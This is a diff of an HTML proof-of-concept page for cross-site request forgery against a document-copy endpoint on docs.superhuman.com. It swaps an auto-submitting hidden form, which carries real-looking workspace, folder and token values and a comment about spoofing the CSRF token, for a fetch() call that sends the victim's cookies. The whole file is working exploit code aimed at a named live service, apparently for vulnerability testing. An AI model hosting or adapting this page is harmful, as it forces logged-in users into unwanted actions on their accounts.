@@ -1,18 +1,22 @@
+<!DOCTYPE html>
 <html>
-  <body>
-    <form action="https://docs.superhuman.com/copy/ARI6JZ2V6O" method="POST" id="csrfForm">
-      <input type="hidden" name="title" value="Copy of doc - CSRF test">
-      <input type="hidden" name="folderId" value="fl-zJCOJ6udvm">
-      <input type="hidden" name="workspaceId" value="ws-F1DwjnlUg8">
-      <input type="hidden" name="deletePageAuthors" value="false">
-      <input type="hidden" name="deleteComments" value="false">
-      <input type="hidden" name="csrf_token" value="C6kuHuDc8dA4CJU9">
-    </form>
-
-    <script>
-      // Attacker-controlled CSRF token injected via header spoofing
-      document.getElementById("csrfForm").submit();
-      document.getElementById("copyDocumentButton").click();
-    </script>
-  </body>
+<body>
+<script>
+fetch("https://docs.superhuman.com/copy/ARI6JZ2V6O", {
+    method: "POST",
+    mode: "cors",
+    credentials: "include", // ask browser to send cookies
+    body: JSON.stringify({
+        "title": "Copy of doc - CSRF Fetch Test",
+        "folderId": "fl-zJCOJ6udvm",
+        "workspaceId": "ws-F1DwjnlUg8",
+        "deletePageAuthors": false,
+        "deleteComments": false
+    })
+})
+.then(r => r.text())
+.then(console.log)
+.catch(console.error);
+</script>
+</body>
 </html>
